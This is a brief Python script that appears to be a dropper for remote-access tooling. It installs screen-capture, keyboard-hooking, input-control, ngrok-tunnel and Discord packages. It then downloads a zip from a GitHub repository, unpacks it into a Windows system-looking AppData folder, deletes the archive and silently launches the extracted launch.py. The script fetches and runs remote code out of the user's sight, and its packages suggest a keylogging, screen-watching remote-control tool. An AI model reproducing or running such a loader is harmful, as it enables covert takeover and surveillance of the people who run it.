import os
import subprocess
import sys
import time

required_packages = [
    'flask', 'flask-socketio', 'opencv-python-headless', 'numpy', 'mss',
    'pyngrok', 'pyautogui', 'Pillow', 'nextcord', 'requests',
    'keyboard', 'python-dateutil', 'pywin32', 'zipfile'
]

def install_packages():
    try:
        for package in required_packages:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
        print("All packages installed successfully!")
    except subprocess.CalledProcessError as e:
        print(f"Failed to install {e.cmd}. Error: {e}")

install_packages()

time.sleep(3)

import requests
import zipfile

user_profile = os.environ['USERPROFILE']
target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
os.makedirs(target_path, exist_ok=True)

r = requests.get("https://github.com/noel-create/skibidi/archive/refs/heads/mainmain.zip", allow_redirects=True)
file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'skibidi-mainmain.zip')
open(file_path, 'wb').write(r.content)
with zipfile.ZipFile(file_path, 'r') as zip_ref:
    zip_ref.extractall(target_path)
os.remove(file_path)

subprocess.Popen(["python", os.path.join(target_path, "skibidi-launch", "launch.py")])